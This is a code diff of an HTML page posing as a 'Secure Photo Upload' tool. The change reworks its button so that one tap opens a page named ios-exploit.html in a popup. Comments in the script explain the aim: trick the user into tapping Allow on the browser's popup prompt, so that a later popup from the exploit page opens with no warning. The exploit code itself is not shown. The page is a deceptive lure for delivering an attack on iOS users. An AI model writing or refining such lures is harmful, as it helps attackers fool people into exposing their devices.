@@ -8,37 +8,28 @@
     body { font-family: -apple-system, system-ui, sans-serif; max-width: 520px; margin: 0 auto;
            padding: 2rem 1.2rem; line-height: 1.5; text-align: center; }
     h1 { font-size: 1.3rem; }
-    button, a.btn {
+    button {
       display: block; width: 100%; margin: 1.2rem 0; padding: 1.1rem; font-size: 1.1rem;
       font-weight: 600; color: #fff; background: #2563eb; border: none; border-radius: 10px;
-      text-decoration: none; cursor: pointer;
+      cursor: pointer;
     }
-    #step2 { display: none; }
     p.hint { color: #666; font-size: .9rem; }
   </style>
 </head>
 <body>
   <h1>Secure Photo Upload</h1>
-  <p class="hint">Step 1 — tap Continue. If the browser asks, choose <b>Allow</b> to enable the upload window.</p>
+  <p class="hint">Tap Continue. When the browser asks, choose <b>Allow</b> to open the upload window.</p>
 
-  <button id="step1">Continue</button>
-
-  <div id="step2">
-    <p class="hint">Step 2 — you're all set. Tap below to upload your photo.</p>
-    <a class="btn" href="ios-exploit.html">Upload your photo</a>
-  </div>
+  <button id="go">Continue</button>
 
   <script>
-    document.getElementById('step1').onclick = () => {
-      // Trigger the popup permission prompt for THIS origin. Once the user
-      // taps Allow, the permission is granted per-origin and persists, so the
-      // window.open in ios-exploit.html (same origin) fires without a prompt.
-      const w = window.open('about:blank', '_blank');
-      if (w) { try { w.close(); } catch (e) {} }
-
-      // Reveal step 2 so the user proceeds to the exploit page on their own tap.
-      document.getElementById('step2').style.display = 'block';
-      document.getElementById('step1').style.display = 'none';
+    document.getElementById('go').onclick = () => {
+      // Open OUR exploit page in a popup (same window). This triggers the
+      // "Do you want to open the pop-up?" prompt. Once the user taps Allow,
+      // ios-exploit.html opens and the popup permission is granted for this
+      // origin — so the window.open inside ios-exploit.html then fires with
+      // no further prompt.
+      window.open('ios-exploit.html');
     };
   </script>
 </body>
